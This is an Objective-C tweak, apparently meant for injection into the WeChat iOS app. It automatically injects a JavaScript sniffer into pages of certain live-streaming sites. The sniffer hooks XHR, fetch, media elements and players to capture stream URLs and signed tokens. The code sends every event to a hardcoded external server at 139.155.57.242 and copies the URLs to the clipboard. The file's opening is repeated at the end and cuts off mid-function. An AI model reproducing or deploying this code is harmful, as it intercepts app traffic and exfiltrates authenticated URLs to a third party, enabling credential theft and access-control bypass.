//
// ALIWeChatSniffer_Full.m
// WeChat H5(友赞/微赞/ukmdg等) 进入目标页才注入；Banner 提示；AV AccessLog；JS v3 全面采集。
// Build: -framework WebKit -framework AVFoundation -framework UIKit -framework Foundation
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kScanInterval       = 1.0;   // WK 扫描间隔
static const NSTimeInterval kInjectDelay        = 0.50;  // 命中域名后注入前延迟
static const NSTimeInterval kDedupeWindow       = 60.0;  // URL 去重窗口
static const double        kProgressThreshold   = 0.55;  // 注入门槛
static const NSTimeInterval kBootGateDelay      = 1.5;   // App Active 后再启动

static const BOOL kPopupOnInject = YES;   // 注入成功提示
static const BOOL kPopupOnHit    = YES;   // 命中提示
static const BOOL kCopyOnHit     = YES;   // 命中复制
static const BOOL kForceUploadAll= YES;   // 非流链接也上传（便于排查）

static NSArray<NSString*> *TargetHosts(void){
    return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
}

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[ALI-FULL] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

#pragma mark - 前向声明

static void start_if_needed(void);
static void installAVObservers(void);
static void scan_loop(void);
static void handleRawEvent(NSDictionary *evt);
static void handleCapturedURL(NSString *url, NSString *from);
static void postText(NSString *text);
static NSString *jsonStringify(NSDictionary *obj);
static NSString *inpageJS(void);

#pragma mark - 全局

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static id g_accessLogToken1 = nil, g_accessLogToken2 = nil;
static BOOL g_started = NO;

#pragma mark - 工具/判定

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"txkey"]||
        [s containsString:@"token="]||[s containsString:@"sign="]||[s containsString:@"auth="]) return YES;
    if ([s containsString:@"phonelive"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]||
        [s containsString:@"ukmdg"]||[s containsString:@"vzuk"]||[s containsString:@"wehfws"]) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

#pragma mark - Banner 提示（非 modal，稳定）

static UIWindow *ALI_BannerWin;
static UILabel  *ALI_BannerLab;
static dispatch_source_t ALI_BannerTimer;

static void ali_banner_show(NSString *text){
    if (!text.length) return;
    on_main(^{
        @try{
            if (!ALI_BannerWin){
                UIWindowScene *scene = nil;
                if (@available(iOS 13.0,*)) {
                    for (UIScene *s in UIApplication.sharedApplication.connectedScenes){
                        if ([s isKindOfClass:[UIWindowScene class]] &&
                            ((UIWindowScene*)s).activationState==UISceneActivationStateForegroundActive){
                            scene = (UIWindowScene*)s; break;
                        }
                    }
                }
                ALI_BannerWin = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
                if (scene) ALI_BannerWin.windowScene = scene;
                ALI_BannerWin.windowLevel = UIWindowLevelStatusBar + 10;
                ALI_BannerWin.backgroundColor = [UIColor clearColor];
                ALI_BannerWin.hidden = NO;

                UIView *host = [[UIView alloc] initWithFrame:ALI_BannerWin.bounds];
                host.userInteractionEnabled = NO;
                [ALI_BannerWin addSubview:host];

                CGFloat W = MIN([UIScreen mainScreen].bounds.size.width, [UIScreen mainScreen].bounds.size.height) - 32.0;
                ALI_BannerLab = [[UILabel alloc] initWithFrame:CGRectMake((host.bounds.size.width-W)/2.0, 48.0, W, 1)];
                ALI_BannerLab.numberOfLines = 0;
                ALI_BannerLab.textAlignment = NSTextAlignmentCenter;
                ALI_BannerLab.textColor = [UIColor whiteColor];
                ALI_BannerLab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
                ALI_BannerLab.layer.cornerRadius = 12.0;
                ALI_BannerLab.layer.masksToBounds = YES;
                ALI_BannerLab.font = [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold];
                [host addSubview:ALI_BannerLab];
            }

            ALI_BannerLab.text = text;
            CGFloat maxW = ALI_BannerLab.frame.size.width - 24.0;
            CGSize sz = [ALI_BannerLab sizeThatFits:CGSizeMake(maxW, CGFLOAT_MAX)];
            CGRect f  = ALI_BannerLab.frame; f.size.height = sz.height + 16.0; ALI_BannerLab.frame = f;

            ALI_BannerWin.alpha = 0.0; ALI_BannerWin.hidden = NO;
            [UIView animateWithDuration:0.18 animations:^{ ALI_BannerWin.alpha = 1.0; }];

            if (ALI_BannerTimer){ dispatch_source_cancel(ALI_BannerTimer); ALI_BannerTimer = nil; }
            ALI_BannerTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
            dispatch_source_set_timer(ALI_BannerTimer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.6*NSEC_PER_SEC)), DISPATCH_TIME_FOREVER, 0);
            dispatch_source_set_event_handler(ALI_BannerTimer, ^{
                [UIView animateWithDuration:0.18 animations:^{ ALI_BannerWin.alpha = 0.0; }
                                 completion:^(__unused BOOL fin){ ALI_BannerWin.hidden = YES; }];
                dispatch_source_cancel(ALI_BannerTimer); ALI_BannerTimer = nil;
            });
            dispatch_resume(ALI_BannerTimer);
        }@catch(__unused NSException *e){}
    });
}
static void popup_safe(NSString *title, NSString *msg, NSString *copyText){
    (void)title;
    if (copyText.length) on_main(^{ @try{ UIPasteboard.generalPasteboard.string = copyText; }@catch(__unused NSException *e){} });
    ali_banner_show(msg.length ? msg : title);
}

#pragma mark - 上报

static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body){
    if (idx >= paths.count) return;
    NSString *url = [kPushHost stringByAppendingString:paths[idx]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST";
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
    req.HTTPBody = body;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
        NSInteger sc = [r isKindOfClass:[NSHTTPURLResponse class]] ? ((NSHTTPURLResponse*)r).statusCode : -1;
        if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx+1, body);
    }] resume];
}
static void postText(NSString *text){
    if (!text) return;
    _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
}
static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

#pragma mark - 事件

static void handleRawEvent(NSDictionary *evt){
    NSString *js = jsonStringify(evt); if (js) postText(js);

    NSString *u = evt[@"url"]; if (!u) return;
    BOOL like = looksLikeStream(u);

    if (kForceUploadAll || like){
        if (!dedupe_skip(u)){
            if (kPopupOnHit){
                if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = u; });
                popup_safe(@"抓到 URL", [NSString stringWithFormat:@"%@\n%@", evt[@"from"]?:evt[@"type"]?:@"inpage", u], u);
            }else if (kCopyOnHit){
                on_main(^{ UIPasteboard.generalPasteboard.string = u; });
            }
            NSDictionary *hit = @{@"type": @"JS_HIT",
                                  @"from": evt[@"from"] ?: evt[@"type"] ?: @"inpage",
                                  @"url": u,
                                  @"page": evt[@"page"] ?: @"",
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s2 = jsonStringify(hit); if (s2) postText(s2);
        }
    }
}
static void handleCapturedURL(NSString *url, NSString *from){
    if (!url) return;
    if (dedupe_skip(url)) return;

    NSDictionary *evt = @{@"type": @"NATIVE_HIT",
                          @"from": from ?: @"native",
                          @"url": url,
                          @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
    NSString *s = jsonStringify(evt); if (s) postText(s);

    if (looksLikeStream(url)){
        if (kPopupOnHit){
            if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; });
            popup_safe(@"捕获播放/请求 URL", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
        }else if (kCopyOnHit){
            on_main(^{ UIPasteboard.generalPasteboard.string = url; });
        }
    }
}

#pragma mark - inpage JS（v3）

static NSString *inpageJS(void){
    return @
"(function(){try{"
 "function send(t,d){try{var p=d||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
  "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);} }catch(e){}}"
 "function looks(u){if(!u)return false;u=(''+u).toLowerCase();"
  "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.mp4')!=-1||u.indexOf('.ts')!=-1)return true;"
  "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1)return true;"
  "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('ukmdg')!=-1||u.indexOf('vzuk')!=-1||u.indexOf('wehfws')!=-1)return true;return false;}"
 "function hit(from,u){try{send('HIT',{from:from,url:u});}catch(e){}}"

 "send('INJECT_OK',{}); send('PAGE_READY',{});"

 "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
   "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
   "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
     "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';var st=(self.status||0);var sample=null;"
       "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
       "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))hit('xhr',u);}catch(e){}};"
     "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
 "})();"
 "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
   "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u)send('FETCH_REQ',{from:'fetch',url:u,method:m});"
     "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
       "if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
         "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
       "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}"
       "if(looks(u))hit('fetch',u);}catch(e){}return r;});}"
   "catch(e){return F.apply(this,arguments)}})();"

 "(function(){if(!('PerformanceObserver'in window))return;try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))hit('perf',u);}}catch(e){}});"
   "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
 "(function(){try{var nodes=document.querySelectorAll('link[rel=\"preload\"],[src],[href]');for(var i=0;i<nodes.length;i++){var n=nodes[i];var u=n.src||n.href||'';if(u){send('RES_INIT',{from:n.tagName.toLowerCase(),url:u});if(looks(u))hit('init-scan',u);}}}catch(e){}})();"

 "(function(){if(window.__ali_media_v3__)return;window.__ali_media_v3__=true;"
   "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))hit(tag,s);}}catch(e){}}"
   "try{var HTMLME=(HTMLMediaElement||HTMLVideoElement||window.HTMLMediaElement);if(HTMLME&&HTMLME.prototype){var dp=Object.getOwnPropertyDescriptor(HTMLME.prototype,'src');if(dp&&dp.set&&!HTMLME.prototype.__ali_src_set__){HTMLME.prototype.__ali_src_set__=true;var old=dp.set;Object.defineProperty(HTMLME.prototype,'src',{configurable:true,enumerable:false,get:dp.get,set:function(v){try{var u=(v||'').toString();send('MEDIA_SETTER',{from:'src-setter',url:u});if(looks(u))hit('src-setter',u);}catch(e){}return old.call(this,v);}});}}}catch(e){}"
   "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];if(!n)continue;"
     "if(n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} if(t==='source'||t==='video'||t==='audio'){var u=n.src||n.currentSrc||'';if(u){send('MEDIA_SET',{from:'mut',url:u});if(looks(u))hit('mut',u);}}}"
     "if(n.querySelectorAll){var vs=n.querySelectorAll('video,audio,source');for(var j=0;j<vs.length;j++){var el=vs[j];var tg=el.tagName.toLowerCase();if(tg==='source'){var u2=el.src||'';if(u2){send('MEDIA_SET',{from:'mut-sub',url:u2});if(looks(u2))hit('mut-sub',u2);}}else if(tg==='video'||tg==='audio'){report(el,tg,'sub');el.addEventListener&&el.addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} }}}}});"
   "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
   "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
   "var setA=Element.prototype.setAttribute;if(!Element.prototype.__ali_setattr__){Element.prototype.__ali_setattr__=true;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio'||t==='source')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))hit('setAttr',v);}}}catch(e){}return setA.apply(this,arguments)};}"
 "})();"

 "(function(){try{if(window.Hls && !window.Hls.__ali_patched__){window.Hls.__ali_patched__=true;var P=window.Hls.prototype;if(P&&P.loadSource){var _ls=P.loadSource;P.loadSource=function(u){try{send('HLS_LOADSOURCE',{from:'hls.js',url:u});if(looks(u))hit('hls.js',u);}catch(e){}return _ls.apply(this,arguments)};}}}catch(e){}})();"
 "(function(){try{if(window.videojs && !window.videojs.__ali_patched__){window.videojs.__ali_patched__=true;var V=window.videojs;var hook=function(p){try{var _src=p.src;if(_src){p.src=function(u){try{var uu=(typeof u==='string')?u:(u&&u.src)||'';if(uu){send('VIDEOJS_SRC',{from:'video.js',url:uu});if(looks(uu))hit('video.js',uu);}}catch(e){}return _src.apply(this,arguments)};}}catch(e){}};try{var pl=V.getPlayers?V.getPlayers():null;if(pl){for(var k in pl){if(pl[k]&&pl[k].player)hook(pl[k].player);} } }catch(e){} V.hook&&V.hook('setup',function(p){try{p&&hook(p)}catch(e){}});}}catch(e){}})();"

 "(function(){if(window.__ali_iframe__)return;window.__ali_iframe__=true;"
   "function repIF(f,ev){try{var u=f.src||'';if(u){send('IFRAME',{from:'iframe:'+ev,url:u});if(looks(u))hit('iframe',u);} }catch(e){}}"
   "var iobs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];if(n&&n.tagName&&n.tagName.toLowerCase()==='iframe'){repIF(n,'add');}}}}});"
   "iobs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
   "var ifs=document.querySelectorAll&&document.querySelectorAll('iframe');for(var i=0;i<(ifs?ifs.length:0);i++){repIF(ifs[i],'init');}"
   "var setA=HTMLIFrameElement&&HTMLIFrameElement.prototype&&HTMLIFrameElement.prototype.setAttribute; if(setA && !HTMLIFrameElement.prototype.__ali_if_set__){HTMLIFrameElement.prototype.__ali_if_set__=true;HTMLIFrameElement.prototype.setAttribute=function(k,v){try{if(k&&k.toLowerCase()==='src'){send('IFRAME_SET',{from:'setAttr',url:v});if(looks(v))hit('iframe-set',v);} }catch(e){} return setA.apply(this,arguments)};}"
 "})();"

 "(function(){if(window.__ali_nav__)return;window.__ali_nav__=true;"
   "function nav(){try{send('NAV',{url:location.href});}catch(e){}}"
   "window.addEventListener('hashchange',nav,true);"
   "if(window.history){['pushState','replaceState'].forEach(function(k){try{var fn=history[k];if(!fn||fn.__ali) return;history[k]=function(){var r=fn.apply(this,arguments);try{nav();}catch(e){}return r};history[k].__ali=true;}catch(e){}});}"
   "document.addEventListener('readystatechange',function(){nav();},true);"
   "setTimeout(nav,200);"
 "})();"

 "(function(){if(window.__ali_ping__)return;window.__ali_ping__=true;var last='';setInterval(function(){try{var u=location.href;if(u!==last){last=u;send('PING',{url:u});}}catch(e){}},1200);} )();"

 "console.log('[ALI_SNIF] injected v3');"
"}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
}

#pragma mark - WK 注入（命中域名才注入）

@interface ALIMessageHandler : NSObject <WKScriptMessageHandler> @end
@implementation ALIMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    if (![message.body isKindOfClass:[NSDictionary class]]) return;
    handleRawEvent((NSDictionary *)message.body);
}
@end
static ALIMessageHandler *g_handler = nil;

static const void *kInjectedKey = &kInjectedKey;
static const void *kKVOKey      = &kKVOKey;

static BOOL hostMatches(NSURL *url){
    if (!url.host) return NO; NSString *h = url.host.lowercaseString;
    for (NSString *pat in TargetHosts()) if ([h hasSuffix:pat.lowercaseString]) return YES;
    return NO;
}
static void prime_userScript_for_allFrames(WKWebView *wv){
    if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
    @try{
        WKUserContentController *ucc = wv.configuration.userContentController;
        for (WKUserScript *s in ucc.userScripts) if ([s.source containsString:@"ALI_SNIF"]) return;
        WKUserScript *us = [[WKUserScript alloc] initWithSource:inpageJS()
                                                  injectionTime:WKUserScriptInjectionTimeAtDocumentEnd
                                               forMainFrameOnly:NO];
        [ucc addUserScript:us];
        if ([ucc respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
            @try{ [ucc removeScriptMessageHandlerForName:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
        }
    }@catch(__unused NSException *e){}
}
static void try_inject_when_ready(WKWebView *wv){
    if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
    if (wv.estimatedProgress < kProgressThreshold) return;

    [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
        if (err) return;
        NSString *rs = [val isKindOfClass:[NSString class]] ? val : @"";
        if (![rs isEqualToString:@"complete"] && ![rs isEqualToString:@"interactive"]) return;

        NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
        if (flag.boolValue) return;

        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectDelay*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
            NSURL *u = wv.URL; if (!hostMatches(u)) return;

            objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);

            WKUserContentController *ucc = wv.configuration.userContentController;
            @try{
                if ([ucc respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
                    [ucc removeScriptMessageHandlerForName:@"__ALI_SNIF__"];
                }
                if (!g_handler) g_handler = [ALIMessageHandler new];
                [ucc addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"];
            }@catch(__unused NSException *e){}

            [wv evaluateJavaScript:inpageJS() completionHandler:nil];

            if (kPopupOnInject){
                NSString *host = wv.URL.host ?: @"(null)";
                if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = (wv.URL.absoluteString ?: @""); });
                popup_safe(@"JS 注入成功", [NSString stringWithFormat:@"已进入：%@\n开始采集（XHR/fetch/资源/Media/Hls.js/iframe）", host], nil);
            }
            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
                                  @"app": @"WeChat",
                                  @"page": (wv.URL.absoluteString ?: @""),
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(evt); if (s) postText(s);
        });
    }];
}

@interface _ALIKVOBox : NSObject
@property (nonatomic, weak) WKWebView *wv;
@end
@implementation _ALIKVOBox
- (void)dealloc{
    @try{ [self.wv removeObserver:self forKeyPath:@"URL"];
          [self.wv removeObserver:self forKeyPath:@"estimatedProgress"]; }@catch(__unused NSException *e){}
}
- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)ctx{
    WKWebView *wv = (WKWebView *)object; if (![wv isKindOfClass:[WKWebView class]]) return;
    if ([keyPath isEqualToString:@"URL"] || [keyPath isEqualToString:@"estimatedProgress"]) {
        NSURL *u = wv.URL;
        if (hostMatches(u)) { prime_userScript_for_allFrames(wv); try_inject_when_ready(wv); }
    }
}
@end
static void attach_kvo_if_needed(WKWebView *wv){
    if (!wv) return;
    _ALIKVOBox *box = objc_getAssociatedObject(wv, kKVOKey);
    if (box) return;
    box = [_ALIKVOBox new]; box.wv = wv;
    objc_setAssociatedObject(wv, kKVOKey, box, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    @try{
        [wv addObserver:box forKeyPath:@"URL" options:NSKeyValueObservingOptionNew context:NULL];
        [wv addObserver:box forKeyPath:@"estimatedProgress" options:NSKeyValueObservingOptionNew context:NULL];
    }@catch(__unused NSException *e){}
}
static void walk_view(UIView *v){
    if (!v) return;
    Class WK = NSClassFromString(@"WKWebView");
    if (WK && [v isKindOfClass:WK]){
        WKWebView *wv = (WKWebView *)v;
        attach_kvo_if_needed(wv);
        if (hostMatches(wv.URL)) { prime_userScript_for_allFrames(wv); try_inject_when_ready(wv); }
    }
    for (UIView *sub in v.subviews) walk_view(sub);
}
static void scan_loop(void){
    on_main(^{
        @try{ for (UIWindow *w in UIApplication.sharedApplication.windows) walk_view(w); }@catch(__unused NSException *e){}
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
}

#pragma mark - AV AccessLog（适配原生播放器）

static void installAVObservers(void){
    @try{
        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
        if (!g_accessLogToken1){
            g_accessLogToken1 = [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(accessLog)]) {
                        id log = [item accessLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            id ev = [log events].lastObject;
                            SEL sel = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            if (ev && [ev respondsToSelector:sel]) {
                                NSString *uri = [ev performSelector:sel];
                                if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVAccessLog"); });
                            }
#pragma clang diagnostic pop
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
        if (!g_accessLogToken2){
            g_accessLogToken2 = [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(errorLog)]) {
                        id log = [item errorLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            for (id ev in [log events]){
                                SEL sel2 = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                if (ev && [ev respondsToSelector:sel2]) {
                                    NSString *uri2 = [ev performSelector:sel2];
                                    if (uri2.length) dispatch_async(gq, ^{ handleCapturedURL(uri2, @"AVErrorLog"); });
                                }
#pragma clang diagnostic pop
                            }
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
    }@catch(__unused NSException *e){}
}

#pragma mark - 启动闸门（避免微信一进程就崩）

static void start_if_needed(void){
    if (g_started) return; g_started = YES;
    on_main(^{
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kBootGateDelay*NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            scan_loop();
            installAVObservers();
            NSDictionary *evt = @{@"type": @"LOADER_INIT", @"app": @"WeChat",
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(evt); if (s) postText(s);
            ali_banner_show(@"AliSniffer 已就绪（进入直播/回放页将自动注入）");
        });
    });
}

#pragma mark - 入口（只注册通知）

__attribute__((constructor))
static void ALIWeChatSniffer_Full_Init(void){
    if (!gq)    gq    = dispatch_queue_create("com.ali.wechat.full", DISPATCH_QUEUE_SERIAL);
    if (!g_seen) g_seen = [NSMutableDictionary dictionary];

    NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
    if (@available(iOS 13.0,*)) {
        [nc addObserverForName:UISceneDidActivateNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
        [nc addObserverForName:UISceneWillEnterForegroundNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    }
    [nc addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    [nc addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
}
//
// ALIWeChatSniffer_Full.m
// WeChat H5(友赞/微赞/ukmdg等) 进入目标页才注入；Banner 提示；AV AccessLog；JS v3 全面采集。
// Build: -framework WebKit -framework AVFoundation -framework UIKit -framework Foundation
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kScanInterval       = 1.0;   // WK 扫描间隔
static const NSTimeInterval kInjectDelay        = 0.50;  // 命中域名后注入前延迟
static const NSTimeInterval kDedupeWindow       = 60.0;  // URL 去重窗口
static const double        kProgressThreshold   = 0.55;  // 注入门槛
static const NSTimeInterval kBootGateDelay      = 1.5;   // App Active 后再启动

static const BOOL kPopupOnInject = YES;   // 注入成功提示
static const BOOL kPopupOnHit    = YES;   // 命中提示
static const BOOL kCopyOnHit     = YES;   // 命中复制
static const BOOL kForceUploadAll= YES;   // 非流链接也上传（便于排查）

static NSArray<NSString*> *TargetHosts(void){
    return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
}

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[ALI-FULL] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

#pragma mark - 前向声明

static void start_if_needed(void);
static void installAVObservers(void);
static void scan_loop(void);
static void handleRawEvent(NSDictionary *evt);
static void handleCapturedURL(NSString *url, NSString *from);
static void postText(NSString *text);
static NSString *jsonStringify(NSDictionary *obj);
static NSString *inpageJS(void);

#pragma mark - 全局

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static id g_accessLogToken1 = nil, g_accessLogToken2 = nil;
static BOOL g_started = NO;

#pragma mark - 工具/判定

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
